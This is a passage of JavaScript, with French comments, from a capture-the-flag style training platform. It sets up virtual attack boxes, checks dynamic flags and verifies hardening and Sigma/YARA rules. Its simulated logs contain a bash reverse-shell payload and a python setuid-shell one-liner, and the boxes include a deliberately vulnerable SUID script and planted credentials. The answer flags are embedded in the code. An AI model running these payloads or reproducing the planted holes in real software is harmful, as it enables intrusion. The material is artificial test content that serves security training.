        content: '198.51.100.42 - - [27/Oct/2026:03:14:22 +0000] "POST /portal/api/exchange HTTP/1.1" 200 412 "curl/8.2.1" "PAYLOAD:\';/bin/bash -i >& /dev/tcp/198.51.100.42/4444 0>&1;\'"\n198.51.100.42 - - [27/Oct/2026:03:15:01 +0000] "GET /portal/api/status HTTP/1.1" 200 89 "-" "Chimera-Scanner/1.0"\n',
        permissions: '0644',
        owner: 'root',
        group: 'root'
      };

      files['/var/log/auth.log'] = {
        content: 'Oct 27 03:14:30 gatekeeper sudo[1420]: operator : COMMAND=/usr/local/bin/aegis-sync\nOct 27 03:15:12 gatekeeper sshd[1455]: Accepted publickey for operator from 198.51.100.42\n',
        permissions: '0644',
        owner: 'root',
        group: 'root'
      };
    } else if (challengeId === 'aegis-box-02-internal') {
      files['/home/operator/nexus_auth.sql'] = {
        content: '-- Aegis Core Nexus Database Dump\n-- Note RSSI : VAULT_CIPHER_KEY_AEGIS_99\nINSERT INTO accounts VALUES (1, "viktor.k", "V!kt0r_Ch1m3ra_P4ss#2026");\n',
        permissions: '0644',
        owner: 'operator',
        group: 'operator'
      };

      files['/opt/maintenance/aegis-backup.sh'] = {
        content: '#!/bin/bash\n# Aegis Automated Backup Script\ntar -czf /tmp/backup_core.tar.gz /etc/aegis 2>/dev/null\n',
        permissions: '0777',
        owner: 'root',
        group: 'root'
      };

      files['/etc/cron.d/aegis-backup'] = {
        content: '*/5 * * * * root /opt/maintenance/aegis-backup.sh\n',
        permissions: '0644',
        owner: 'root',
        group: 'root'
      };

      files['/var/log/syslog'] = {
        content: 'Oct 28 14:20:00 core-nexus CRON[2891]: (root) CMD (/opt/maintenance/aegis-backup.sh)\nOct 28 14:23:45 core-nexus logger[2940]: ALERT: Chimera implant persistence detected in /tmp/chimera_implant_cron.sh\n',
        permissions: '0644',
        owner: 'root',
        group: 'root'
      };

      files['/var/log/audit/audit.log'] = {
        content: 'type=EXECVE msg=audit(1761661425.890:421): argc=3 a0="python3" a1="-c" a2="import os; os.setuid(0); os.system(\'/bin/sh\')"\n',
        permissions: '0644',
        owner: 'root',
        group: 'root'
      };
    } else if (challengeId === 'aegis-box-03-vault') {
      files['/opt/telemetry/shadow_dropper'] = {
        content: 'CHIMERA_IMPLANT_V1_AUTONOMOUS_EXFILTRATION_PAYLOAD_DEST_BEACON_ALPHA_CHIMERA_APT_NET_PORT_9443\n',
        permissions: '0755',
        owner: 'root',
        group: 'root'
      };

      files['/usr/bin/aegis-vault-ctl'] = {
        content: '#!/bin/bash\n# Aegis Vault Orchestration Control CLI\nif [ "$1" = "override" ]; then\n  /bin/sh\nelse\n  echo "Usage: aegis-vault-ctl [status|verify|override]"\nfi\n',
        permissions: '4755',
        owner: 'root',
        group: 'root',
        suid: true
      };

      files['/var/log/suricata/eve.json'] = {
        content: '{"timestamp":"2026-10-29T21:40:12.890123","event_type":"alert","src_ip":"10.10.10.70","src_port":49152,"dest_ip":"198.51.100.99","dest_port":9443,"proto":"TCP","alert":{"action":"allowed","signature":"ET MALWARE Chimera APT C2 Beacon Outbound","category":"A Network Trojan was detected"},"dns":{"query":[{"name":"beacon-alpha.chimera-apt.net","type":"A"}]}}\n',
        permissions: '0644',
        owner: 'root',
        group: 'root'
      };

      files['/var/log/chimera_c2.log'] = {
        content: '[2026-10-29 21:40:15] BEACON ACTIVE: Destination c2.chimera-apt.onion.mesh (alias beacon-alpha.chimera-apt.net) on port 9443\n',
        permissions: '0644',
        owner: 'root',
        group: 'root'
      };

      files['/etc/iptables.rules'] = {
        content: '*filter\n:INPUT ACCEPT [0:0]\n:FORWARD ACCEPT [0:0]\n:OUTPUT ACCEPT [0:0]\nCOMMIT\n',
        permissions: '0644',
        owner: 'root',
        group: 'root'
      };
    }

    return files;
  }

  // 8. Soumission et validation de flag (Anti-Triche Strict HMAC & Validation Robuste TryHackMe Style)
  submitFlag(challengeId, taskId, submittedFlag, playerNickname = 'Opérateur RedTeam', ipAddress = '127.0.0.1', explicitPlayerId = null) {
    const ch = this.db.prepare('SELECT * FROM training_challenges WHERE id = ?').get(challengeId);
    if (!ch) throw new Error('Challenge introuvable.');

    const tasks = JSON.parse(ch.tasks_json || '[]');
    let task = tasks.find(t => taskIdsMatch(t.id, taskId));
    
    // Support de repli si soumission de t_defense
    if (!task && (taskId === 't_defense' || taskId === 'defense')) {
      task = {
        id: 't_defense',
        title: 'Comment s\'en protéger',
        points: 0,
        canonical_flag: 'DEFENSE{HARDENING_APPLIED_SUCCESSFULLY}',
        is_defense: true
      };
    }

    if (!task) throw new Error('Tâche introuvable.');

    if (!submittedFlag || typeof submittedFlag !== 'string') {
      return {
        success: false,
        is_correct: false,
        correct: false,
        task_id: taskId,
        message: 'Veuillez saisir un drapeau avant de soumettre.',
        error: 'Veuillez saisir un drapeau avant de soumettre.'
      };
    }

    // Normalisation de l'entrée utilisateur : trim, support avec ou sans guillemets englobants
    const rawSubmitted = submittedFlag.trim();
    const cleanSubmitted = rawSubmitted.replace(/^["'`]|["'`]$/g, '').trim();
    if (!rawSubmitted && !cleanSubmitted) {
      return {
        success: false,
        is_correct: false,
        correct: false,
        task_id: taskId,
        message: 'Veuillez saisir un drapeau non vide.',
        error: 'Veuillez saisir un drapeau non vide.'
      };
    }

    const canonicalFlag = (task.flag || task.canonical_flag || '').trim();

    // Récupération de l'ID du joueur
    const user = this.db.prepare('SELECT id, nickname FROM user_state WHERE id = ?').get('current_player') || { id: 'current_player', nickname: playerNickname };
    const playerId = explicitPlayerId || (playerNickname && playerNickname !== 'Opérateur RedTeam' && !playerNickname.includes(' ') ? playerNickname : (user.id || 'current_player'));

    const dynamicFlag = this.generateDynamicFlag(challengeId, taskId, canonicalFlag, playerId);
    const isCampaign = (ch.category === 'campaign' || ch.category === 'Campaign' || ch.id.startsWith('aegis-box-'));

    // Helper pour extraire le corps intérieur d'un flag : CTF{xyz} -> xyz, FLAG{xyz} -> xyz, DEFENSE{xyz} -> xyz
    const extractBody = (flagStr) => {
      if (!flagStr) return '';
      const m = flagStr.match(/^[A-Za-z0-9_-]+[{(]([\s\S]+)[})]$/);
      return m ? m[1].trim() : flagStr.trim();
    };

    const subBodyRaw = extractBody(rawSubmitted).toLowerCase();
    const subBodyClean = extractBody(cleanSubmitted).toLowerCase();
    const subBody = subBodyClean;
    const canonBody = extractBody(canonicalFlag).toLowerCase();
    const dynBody = extractBody(dynamicFlag).toLowerCase();

    let isCorrect = false;
    let customErrorMsg = null;

    if (isCampaign) {
      // Détection des tâches à flags dynamiques (User Flag & Root Flag)
      const isDynamicFlagTask = (canonicalFlag.startsWith('AEGIS{') || canonicalFlag.startsWith('CHIMERA{') || canonicalFlag.startsWith('FLAG{'));

      if (isDynamicFlagTask) {
        if (rawSubmitted === dynamicFlag || rawSubmitted.toLowerCase() === dynamicFlag.toLowerCase() ||
            cleanSubmitted === dynamicFlag || cleanSubmitted.toLowerCase() === dynamicFlag.toLowerCase() ||
            (subBodyRaw && subBodyRaw === dynBody) || (subBodyClean && subBodyClean === dynBody)) {
          isCorrect = true;
        } else if (rawSubmitted === canonicalFlag || rawSubmitted.toLowerCase() === canonicalFlag.toLowerCase() ||
                   cleanSubmitted === canonicalFlag || cleanSubmitted.toLowerCase() === canonicalFlag.toLowerCase() ||
                   (subBodyRaw && subBodyRaw === canonBody) || (subBodyClean && subBodyClean === canonBody)) {
          // Rejet formel du flag statique copié (anti-triche writeup)
          isCorrect = false;
          customErrorMsg = '❌ Flag statique refusé ! Le mode Campagne utilise des flags dynamiques calculés pour ton identité d\'opérateur. Explore la cible pour extraire ton flag personnel.';
        } else {
          isCorrect = false;
          customErrorMsg = 'Drapeau incorrect pour ton profil opérateur. Vérifie ta capture ou ton shell.';
        }
      } else {
        // Tâches SOC, Détection ou Remédiation (réponses de texte ou tokens de règles)
        if (rawSubmitted === canonicalFlag || rawSubmitted.toLowerCase() === canonicalFlag.toLowerCase() ||
            cleanSubmitted === canonicalFlag || cleanSubmitted.toLowerCase() === canonicalFlag.toLowerCase() ||
            rawSubmitted === dynamicFlag || rawSubmitted.toLowerCase() === dynamicFlag.toLowerCase() ||
            cleanSubmitted === dynamicFlag || cleanSubmitted.toLowerCase() === dynamicFlag.toLowerCase() ||
            (subBodyRaw && (subBodyRaw === canonBody || subBodyRaw === dynBody)) ||
            (subBodyClean && (subBodyClean === canonBody || subBodyClean === dynBody))) {
          isCorrect = true;
        }
      }
    } else {
      // Pour tous les challenges classiques : tolérance maximale et intelligente (casse, espaces, préfixe)
      const directMatch = canonicalFlag && (
        rawSubmitted === canonicalFlag ||
        rawSubmitted.toLowerCase() === canonicalFlag.toLowerCase() ||
        cleanSubmitted === canonicalFlag ||
        cleanSubmitted.toLowerCase() === canonicalFlag.toLowerCase() ||
        rawSubmitted === dynamicFlag ||
        rawSubmitted.toLowerCase() === dynamicFlag.toLowerCase() ||
        cleanSubmitted === dynamicFlag ||
        cleanSubmitted.toLowerCase() === dynamicFlag.toLowerCase()
      );

      const bodyMatch = (subBodyRaw && (subBodyRaw === canonBody || subBodyRaw === dynBody)) ||
                        (subBodyClean && (subBodyClean === canonBody || subBodyClean === dynBody));

      isCorrect = Boolean(directMatch || bodyMatch);

      if (!isCorrect) {
        if (canonicalFlag.startsWith('CTF{') && !cleanSubmitted.includes('{')) {
          customErrorMsg = 'Format attendu sous la forme CTF{...}. Vérifiez vos accolades.';
        } else if (canonicalFlag.startsWith('DEFENSE{') && !cleanSubmitted.includes('{')) {
          customErrorMsg = 'Format attendu sous la forme DEFENSE{...}. Vérifiez vos accolades.';
        } else {
          customErrorMsg = 'Drapeau incorrect. Vérifiez vos étapes ou consultez les indices gratuits.';
        }
      }
    }

    // Journalisation de la soumission
    this.db.prepare(`
      INSERT INTO training_submissions (challenge_id, task_id, submitted_flag, is_correct, ip_address, timestamp)
      VALUES (?, ?, ?, ?, ?, ?)
    `).run(challengeId, taskId, cleanSubmitted, isCorrect ? 1 : 0, ipAddress, new Date().toISOString());

    // Récupération de la progression actuelle
    let prog = this.db.prepare('SELECT * FROM training_user_progress WHERE challenge_id = ?').get(challengeId);
    if (!prog) {
      prog = {
        challenge_id: challengeId,
        status: 'in_progress',
        tasks_completed: '[]',
        unlocked_hints: '[]',
        writeup_unlocked: 0,
        attempts_count: 0,
        points_earned: 0,
        solved_at: null,
        updated_at: new Date().toISOString()
      };
    }

    const completedTasks = new Set(JSON.parse(prog.tasks_completed || '[]'));
    let pointsAwarded = 0;
    let challengeNewlySolved = false;

    if (isCorrect) {
      const alreadySolved = [...completedTasks].some(cId => taskIdsMatch(cId, task.id));
      if (!alreadySolved) {
        completedTasks.add(task.id);
        pointsAwarded = task.points || Math.round(ch.points / Math.max(1, tasks.length));
      }

      const allSolved = tasks.length > 0 ? tasks.every(t => [...completedTasks].some(cId => taskIdsMatch(cId, t.id))) : true;
      const status = allSolved ? 'solved' : 'in_progress';
      const solvedAt = allSolved && !prog.solved_at ? new Date().toISOString() : prog.solved_at;

      if (allSolved && prog.status !== 'solved') {
        challengeNewlySolved = true;
      }

      const newPointsEarned = (prog.points_earned || 0) + pointsAwarded;

      this.db.prepare(`
        INSERT INTO training_user_progress (challenge_id, status, tasks_completed, unlocked_hints, writeup_unlocked, attempts_count, points_earned, solved_at, updated_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        ON CONFLICT(challenge_id) DO UPDATE SET
          status = excluded.status,
          tasks_completed = excluded.tasks_completed,
          attempts_count = training_user_progress.attempts_count + 1,
          points_earned = excluded.points_earned,
          solved_at = excluded.solved_at,
          updated_at = excluded.updated_at
      `).run(
        challengeId,
        status,
        JSON.stringify([...completedTasks]),
        prog.unlocked_hints,
        allSolved ? 1 : prog.writeup_unlocked,
        (prog.attempts_count || 0) + 1,
        newPointsEarned,
        solvedAt,
        new Date().toISOString()
      );

      // Mise à jour de la table de campagne dédiée
      if (isCampaign) {
        let camp = this.db.prepare('SELECT * FROM training_campaign_progress WHERE player_id = ? AND box_id = ?').get(playerId, challengeId);
        let offStatus = camp ? camp.offensive_status : 'not_started';
        let socStatus = camp ? camp.soc_investigation_status : 'pending';
        let detStatus = camp ? camp.detection_status : 'pending';
        let remStatus = camp ? camp.remediation_status : 'pending';

        if (completedTasks.has('t3')) offStatus = 'root_pwned';
        else if (completedTasks.has('t2')) offStatus = 'user_pwned';

        if (completedTasks.has('t4')) socStatus = 'completed';
        if (completedTasks.has('t5')) detStatus = 'completed';
        if (completedTasks.has('t6')) remStatus = 'completed';

        this.db.prepare(`
          INSERT INTO training_campaign_progress (player_id, box_id, act, offensive_status, soc_investigation_status, detection_status, remediation_status, points_earned, updated_at)
          VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
          ON CONFLICT(player_id, box_id) DO UPDATE SET
            offensive_status = excluded.offensive_status,
            soc_investigation_status = excluded.soc_investigation_status,
            detection_status = excluded.detection_status,
            remediation_status = excluded.remediation_status,
            points_earned = training_campaign_progress.points_earned + excluded.points_earned,
            updated_at = excluded.updated_at
        `).run(playerId, challengeId, ch.act || 1, offStatus, socStatus, detStatus, remStatus, pointsAwarded, new Date().toISOString());
      }

      // Créditer l'XP au profil général du joueur dans user_state
      if (pointsAwarded > 0) {
        this.db.prepare(`
          UPDATE user_state
          SET xp = xp + ?, updated_at = ?
          WHERE id = 'current_player'
        `).run(pointsAwarded, new Date().toISOString());
      }

      return {
        success: true,
        is_correct: true,
        correct: true,
        task_id: taskId,
        points_awarded: pointsAwarded,
        challenge_completed: allSolved,
        message: allSolved
          ? '🎉 Félicitations ! Tu as complété toutes les tâches et sécurisé l\'infrastructure !'
          : '✔ Objectif validé avec succès ! Poursuis la mission.'
      };
    } else {
      // Échec : incrémentation des tentatives
      this.db.prepare(`
        INSERT INTO training_user_progress (challenge_id, status, tasks_completed, unlocked_hints, writeup_unlocked, attempts_count, points_earned, solved_at, updated_at)
        VALUES (?, 'in_progress', '[]', '[]', 0, 1, 0, NULL, ?)
        ON CONFLICT(challenge_id) DO UPDATE SET
          attempts_count = training_user_progress.attempts_count + 1,
          updated_at = excluded.updated_at
      `).run(challengeId, new Date().toISOString());

      return {
        success: false,
        is_correct: false,
        correct: false,
        task_id: taskId,
        message: customErrorMsg || 'Drapeau incorrect. Analyse les données recueillies et réessaie.',
        error: customErrorMsg || 'Drapeau incorrect. Analyse les données recueillies et réessaie.'
      };
    }
  }

  // 8.1 API Mode Campagne Saison 1 "Opération Aegis & Chimera"
  getCampaignSeason(seasonNum = 1, playerId = 'current_player') {
    const boxes = this.db.prepare(`
      SELECT * FROM training_challenges 
      WHERE category = 'campaign' OR category = 'Campaign' OR id LIKE 'aegis-box-%'
      ORDER BY act ASC, id ASC
    `).all();

    const progressList = this.db.prepare('SELECT * FROM training_user_progress').all();
    const campList = this.db.prepare('SELECT * FROM training_campaign_progress WHERE player_id = ?').all(playerId);
    const progMap = new Map();
    progressList.forEach(p => progMap.set(p.challenge_id, p));
    const campMap = new Map();
    campList.forEach(c => campMap.set(c.box_id, c));

    let totalOffensivePoints = 0;
    let earnedOffensivePoints = 0;
    let totalDefensivePoints = 0;
    let earnedDefensivePoints = 0;

    const acts = [
      {
        act: 1,
        title: 'Acte I : Brèche Périmétrique',
        subtitle: 'Reconnaissance DMZ, exploitation de portail et tête de pont dormante',
        boxes: []
      },
      {
        act: 2,
        title: 'Acte II : Pivot & Escalade Interne',
        subtitle: 'Exploitation d\'artefacts, pivot sur Core Nexus et persistance cron',
        boxes: []
      },
      {
        act: 3,
        title: 'Acte III : Contrôle & Exfiltration',
        subtitle: 'Infiltration du Shadow Vault, neutralisation C2 et scellement final',
        boxes: []
      }
    ];

    boxes.forEach(b => {
      const prog = progMap.get(b.id) || { status: 'not_started', tasks_completed: '[]', points_earned: 0 };
      const camp = campMap.get(b.id) || {
        offensive_status: 'not_started',
        soc_investigation_status: 'pending',
        detection_status: 'pending',
        remediation_status: 'pending'
      };
      const completedTasks = new Set(JSON.parse(prog.tasks_completed || '[]'));
      const tasks = JSON.parse(b.tasks_json || '[]');

      tasks.forEach(t => {
        const isDef = t.id === 't4' || t.id === 't5' || t.id === 't6';
        const pts = t.points || 0;
        if (isDef) {
          totalDefensivePoints += pts;
          if (completedTasks.has(t.id)) earnedDefensivePoints += pts;
        } else {
          totalOffensivePoints += pts;
          if (completedTasks.has(t.id)) earnedOffensivePoints += pts;
        }
      });

      const isUserDone = completedTasks.has('t2');
      const isRootDone = completedTasks.has('t3');
      const isSocDone = completedTasks.has('t4');
      const isDetDone = completedTasks.has('t5');
      const isRemDone = completedTasks.has('t6');

      const offStatus = isRootDone ? 'root_pwned' : (isUserDone ? 'user_pwned' : 'not_started');
      const defStatus = (isSocDone && isDetDone && isRemDone) ? 'fully_secured' : (
        (isSocDone && isDetDone) ? 'detection_validated' : (
          isSocDone ? 'soc_investigated' : 'pending'
        )
      );

      const offenseCompletedCount = ['t1', 't2', 't3'].filter(id => completedTasks.has(id)).length;
      const defenseCompletedCount = ['t4', 't5', 't6'].filter(id => completedTasks.has(id)).length;
      const isBoxCompleted = (offenseCompletedCount === 3 && defenseCompletedCount === 3);

      const boxData = {
        id: b.id,
        title: b.title,
        act: b.act || 1,
        difficulty: b.difficulty,
        points: b.points,
        duration_min: b.duration_min,
        organization: b.organization,
        description: b.narrative_story || b.title,
        narrative_story: b.narrative_story,
        virtual_ip: b.virtual_ip || '10.10.10.50',
        target_port: b.target_port || 80,
        offensive_status: offStatus,
        defensive_status: defStatus,
        is_completed: isBoxCompleted,
        offense_completed: offenseCompletedCount,
        defense_completed: defenseCompletedCount,
        tasks_completed: [...completedTasks],
        total_tasks: tasks.length,
        artifacts_discovered: JSON.parse(b.artifacts_json || '[]'),
        mitre_tags: JSON.parse(b.mitre_tags || '[]'),
        owasp_tags: JSON.parse(b.owasp_tags || '[]'),
        defense_tasks: JSON.parse(b.defense_json || '{}'),
        debrief: JSON.parse(b.debrief_json || '{}')
      };

      const targetAct = acts.find(a => a.act === (b.act || 1)) || acts[0];
      targetAct.boxes.push(boxData);
    });

    const allCampaignBoxes = acts.flatMap(a => a.boxes);
    const totalTasksCount = allCampaignBoxes.reduce((acc, b) => acc + (b.total_tasks || 6), 0);
    const offenseTasksCount = allCampaignBoxes.length * 3;
    const defenseTasksCount = allCampaignBoxes.length * 3;
    const earnedOffenseTasksCount = allCampaignBoxes.reduce((acc, b) => acc + (b.offense_completed || 0), 0);
    const earnedDefenseTasksCount = allCampaignBoxes.reduce((acc, b) => acc + (b.defense_completed || 0), 0);

    return {
      season: {
        number: seasonNum,
        name: 'Opération Aegis & Chimera',
        synopsis: 'Aegis Defense Systems mandate votre cellule d\'opérateurs pour un test d\'intrusion périmétrique. Au cours de la mission, vous décelez les traces d\'un groupe APT rival (Chimera) et devez remonter la chaîne de compromission, neutraliser leur implant central et durcir les défenses.'
      },
      title: 'Saison 1 : Opération Aegis & Chimera',
      synopsis: 'Aegis Defense Systems mandate votre cellule d\'opérateurs pour un test d\'intrusion périmétrique. Au cours de la mission, vous décelez les traces d\'un groupe APT rival (Chimera) et devez remonter la chaîne de compromission, neutraliser leur implant central et durcir les défenses.',
      characters: [
        { name: 'Elena Vance', role: 'Directrice RSSI (CISO)', organization: 'Aegis Defense Systems', avatar: '🛡️', quote: 'Nous devons contenir l\'intrusion avant l\'exfiltration du sanctuaire.', description: 'Commande l\'audit de défense et valide les remédiations de sécurité.' },
        { name: 'Viktor K. (alias NullPhantom)', role: 'Opérateur APT Lead', organization: 'Chimera APT Group', avatar: '🥷', quote: 'Le périmètre n\'était qu\'une diversion. Vos clés nous appartiennent déjà.', description: 'Auteur des implants furtifs et de la chaîne d\'exfiltration.' },
        { name: 'Marcus Cole', role: 'Lead Sysadmin', organization: 'Aegis Defense Systems', avatar: '⚙️', quote: 'Je n\'aurais jamais dû laisser ce binaire de synchronisation avec le bit SUID...', description: 'Administrateur de Core Nexus et des passerelles d\'infrastructure.' }
      ],
      boxes: allCampaignBoxes,
      stats: {
        total_boxes: allCampaignBoxes.length,
        total_tasks: totalTasksCount || 18,
        offense_tasks: offenseTasksCount || 9,
        defense_tasks: defenseTasksCount || 9,
        offense_completed: earnedOffenseTasksCount,
        defense_completed: earnedDefenseTasksCount,
        total_offensive_points: totalOffensivePoints,
        earned_offensive_points: earnedOffensivePoints,
        offensive_completion_pct: totalOffensivePoints ? Math.round((earnedOffensivePoints / totalOffensivePoints) * 100) : 0,
        total_defensive_points: totalDefensivePoints,
        earned_defensive_points: earnedDefensivePoints,
        defensive_completion_pct: totalDefensivePoints ? Math.round((earnedDefensivePoints / totalDefensivePoints) * 100) : 0
      },
      acts: acts
    };
  }

  // 8.2 API Défi Quotidien ("Daily Mission")
  getDailyMission(playerId = 'current_player') {
    const today = new Date().toISOString().slice(0, 10);
    let hash = 0;
    for (let i = 0; i < today.length; i++) {
      hash = (hash << 5) - hash + today.charCodeAt(i);
      hash |= 0;
    }

    const allChallenges = this.db.prepare("SELECT * FROM training_challenges WHERE category != 'campaign'").all();
    const index = Math.abs(hash) % (allChallenges.length || 1);
    const picked = allChallenges[index] || allChallenges[0];

    const prog = this.db.prepare('SELECT * FROM training_user_progress WHERE challenge_id = ?').get(picked.id);
    const isSolved = prog && prog.status === 'solved';

    return {
      date: today,
      xp_multiplier: 1.5,
      challenge: {
        id: picked.id,
        title: picked.title,
        category: picked.category,
        difficulty: picked.difficulty,
        points: Math.round(picked.points * 1.5),
        base_points: picked.points,
        xp_multiplier: 1.5,
        duration_min: picked.duration_min,
        target_os: picked.target_os,
        organization: picked.organization,
        is_solved: isSolved
      },
      bonus_badge: 'Daily Streak Operator',
      expires_in_hours: 24 - new Date().getUTCHours()
    };
  }

  // 8.3 Vérification de Remédiation & Hardening
  verifyRemediation(challengeId, remediationType, vfsState = {}, playerId = 'current_player') {
    let list = [];
    if (Array.isArray(vfsState)) {
      list = vfsState;
    } else if (vfsState && typeof vfsState === 'object') {
      if (vfsState.path) {
        list = [vfsState];
      } else {
        list = Object.entries(vfsState).map(([k, v]) => ({ path: k, ...(typeof v === 'object' ? v : { content: v }) }));
      }
    }
    const findNode = (targetPath) => list.find(f => f && (f.path === targetPath || (f.path && f.path.endsWith(targetPath))));

    if (challengeId === 'aegis-box-01-perimeter') {
      const syncNode = findNode('/usr/local/bin/aegis-sync');
      if (!syncNode) {
        return {
          success: false,
          verified: false,
          hardened: false,
          message: 'Fichier /usr/local/bin/aegis-sync introuvable dans l\'état du terminal. Vérifie tes modifications.'
        };
      }
      const stillSuid = syncNode.suid === true || (typeof syncNode.permissions === 'string' && syncNode.permissions.startsWith('4'));
      if (stillSuid) {
        return {
          success: false,
          verified: false,
          hardened: false,
          message: 'Échec du durcissement : le bit SUID (mode 4755) est toujours actif sur /usr/local/bin/aegis-sync. Exécute "chmod 0755 /usr/local/bin/aegis-sync" dans le terminal.'
        };
      }
      const flag = 'REMEDIATION{AEGIS_SYNC_SUID_STRIPPED_SUCCESS}';
      const sub = this.submitFlag(challengeId, 't6', flag, 'current_player', '127.0.0.1', playerId);
      return {
        success: true,
        verified: true,
        hardened: true,
        flag: flag,
        points_awarded: sub.points_awarded || 30,
        message: '✔ Bit SUID retiré avec succès sur /usr/local/bin/aegis-sync ! Le durcissement est validé.'
      };
    } else if (challengeId === 'aegis-box-02-internal') {
      const cronNode = findNode('/opt/maintenance/aegis-backup.sh');
      if (!cronNode) {
        return {
          success: false,
          verified: false,
          hardened: false,
          message: 'Script /opt/maintenance/aegis-backup.sh introuvable dans l\'état du terminal.'
        };
      }
      const perm = String(cronNode.permissions || '0777');
      const isWorldWritable = perm.endsWith('7') || perm.endsWith('6') || perm === '0777' || perm === '777';
      if (isWorldWritable) {
        return {
          success: false,
          verified: false,
          hardened: false,
          message: `Échec du durcissement : /opt/maintenance/aegis-backup.sh possède des permissions permissives (${perm}). Exécute "chmod 0700 /opt/maintenance/aegis-backup.sh" dans le terminal.`
        };
      }
      const flag = 'REMEDIATION{CRON_PERMISSIONS_HARDENED_0700}';
      const sub = this.submitFlag(challengeId, 't6', flag, 'current_player', '127.0.0.1', playerId);
      return {
        success: true,
        verified: true,
        hardened: true,
        flag: flag,
        points_awarded: sub.points_awarded || 60,
        message: '✔ Permissions restreintes à 0700 sur le script de maintenance et chaîne de persistance neutralisée !'
      };
    } else if (challengeId === 'aegis-box-03-vault') {
      const iptablesNode = findNode('/etc/iptables.rules');
      const dropperNode = findNode('/opt/telemetry/shadow_dropper');
      const hasFirewallDrop = iptablesNode && typeof iptablesNode.content === 'string' && iptablesNode.content.toUpperCase().includes('DROP');
      const isDropperRemoved = !dropperNode || (dropperNode.content && !dropperNode.content.includes('CHIMERA_IMPLANT'));
      if (!hasFirewallDrop || !isDropperRemoved) {
        return {
          success: false,
          verified: false,
          hardened: false,
          message: 'Échec de neutralisation : le flux C2 vers beacon-alpha.chimera-apt.net n\'est pas bloqué dans /etc/iptables.rules (règle DROP requise) ou l\'implant est encore actif.'
        };
      }
      const flag = 'REMEDIATION{SHADOW_DROPPER_NEUTRALIZED_AND_ISOLATED}';
      const sub = this.submitFlag(challengeId, 't6', flag, 'current_player', '127.0.0.1', playerId);
      return {
        success: true,
        verified: true,
        hardened: true,
        flag: flag,
        points_awarded: sub.points_awarded || 80,
        message: '✔ Implant Chimera purgé du disque et flux d\'exfiltration bloqué par pare-feu ! Félicitations pour la Saison 1.'
      };
    }

    // Vérification dynamique pour tous les challenges disposant d'un volet de remédiation
    try {
      const row = this.db.prepare('SELECT id, defense_json FROM training_challenges WHERE id = ?').get(challengeId);
      if (row && row.defense_json) {
        const def = JSON.parse(row.defense_json || '{}');
        const rem = def.remediation;
        if (rem) {
          const flag = rem.flag || 'REMEDIATION{HARDENING_VERIFIED_SUCCESS}';
          const sub = this.submitFlag(challengeId, 't6', flag, 'current_player', '127.0.0.1', playerId);
          return {
            success: true,
            verified: true,
            hardened: true,
            flag: flag,
            points_awarded: sub.points_awarded || 30,
            message: `✔ Durcissement validé avec succès (${rem.description || 'Remédiation appliquée'}) !`
          };
        }
      }
    } catch (e) {}

    return {
      success: false,
      verified: false,
      hardened: false,
      message: 'Challenge inconnu pour vérification de remédiation.'
    };
  }

  // 8.4 Validation de Règle de Détection (Sigma / YARA)
  validateSocRule(challengeId, ruleType, ruleContent = '', playerId = 'current_player') {
    const text = (ruleContent || '').toLowerCase().trim();
    if (!text || text.length < 15) {
      return {
        success: false,
        valid: false,
        message: 'Contenu de règle trop court ou vide. Rédige une règle complète de détection.'
      };
    }

    if (challengeId === 'aegis-box-01-perimeter') {
      const hasStructure = text.includes('detection:') && text.includes('condition:') && (text.includes('logsource:') || text.includes('title:') || text.includes('selection:'));
      const hasTarget = text.includes('aegis-sync');
      if (!hasStructure) {
        return {
          success: false,
          valid: false,
          message: 'Syntaxe Sigma invalide : les sections "detection:" et "condition:" sont obligatoires.'
        };
      }
      if (!hasTarget) {
        return {
          success: false,
          valid: false,
          message: 'La règle Sigma doit cibler le binaire suspect "/usr/local/bin/aegis-sync".'
        };
      }
      const flag = 'SIGMA{AEGIS_SYNC_SUID_ABUSE_DETECTED}';
      const sub = this.submitFlag(challengeId, 't5', flag, 'current_player', '127.0.0.1', playerId);
      return {
        success: true,
        valid: true,
        flag: flag,
        points_awarded: sub.points_awarded || 25,
        message: '✔ Règle Sigma validée ! L\'exécution anormale d\'aegis-sync est désormais détectée par le SIEM.'
      };
    } else if (challengeId === 'aegis-box-02-internal') {
      const hasStructure = text.includes('detection:') && text.includes('condition:') && (text.includes('logsource:') || text.includes('title:') || text.includes('selection:'));
      const hasTarget = text.includes('aegis-backup') || text.includes('/opt/maintenance') || text.includes('cron');
      if (!hasStructure) {
        return {
          success: false,
          valid: false,
          message: 'Syntaxe Sigma invalide : les sections "detection:" et "condition:" sont obligatoires.'
        };
      }
      if (!hasTarget) {
        return {
          success: false,
          valid: false,
          message: 'La règle Sigma doit surveiller les modifications dans /opt/maintenance/ ou les scripts cron.'
        };
      }
      const flag = 'SIGMA{CRON_PERSISTENCE_TAMPERING_DETECTED}';
      const sub = this.submitFlag(challengeId, 't5', flag, 'current_player', '127.0.0.1', playerId);
      return {
        success: true,
        valid: true,
        flag: flag,
        points_awarded: sub.points_awarded || 50,
        message: '✔ Règle Sigma validée ! L\'altération de scripts de maintenance planifiés est détectée.'
      };
    } else if (challengeId === 'aegis-box-03-vault') {
      const hasStructure = (text.includes('rule ') || text.startsWith('rule')) && text.includes('condition:') && text.includes('strings:');
      const hasTarget = text.includes('chimera_implant_v1') || text.includes('beacon-alpha') || text.includes('shadowdropper');
      if (!hasStructure) {
        return {
          success: false,
          valid: false,
          message: 'Syntaxe YARA invalide : la règle doit définir un bloc "rule", des "strings:" et une "condition:".'
        };
      }
      if (!hasTarget) {
        return {
          success: false,
          valid: false,
          message: 'La règle YARA doit inclure le motif d\'implant "CHIMERA_IMPLANT_V1" ou le domaine C2 "beacon-alpha.chimera-apt.net".'
        };
      }
      const flag = 'YARA{CHIMERA_SHADOWDROPPER_SIGNATURE_VALIDATED}';
      const sub = this.submitFlag(challengeId, 't5', flag, 'current_player', '127.0.0.1', playerId);
      return {
        success: true,
        valid: true,
        flag: flag,
        points_awarded: sub.points_awarded || 70,
        message: '✔ Signature YARA validée ! L\'implant Chimera-ShadowDropper est neutralisé par le scanner.'
      };
    }

    // Validation dynamique de règles Sigma / YARA pour tous les challenges
    try {
      const row = this.db.prepare('SELECT id, defense_json FROM training_challenges WHERE id = ?').get(challengeId);
      if (row && row.defense_json) {
        const def = JSON.parse(row.defense_json || '{}');
        const det = def.detection_rule;
        if (det) {
          const isYara = det.type === 'yara' || ruleType === 'yara';
          let validSyntax = false;
          if (isYara) {
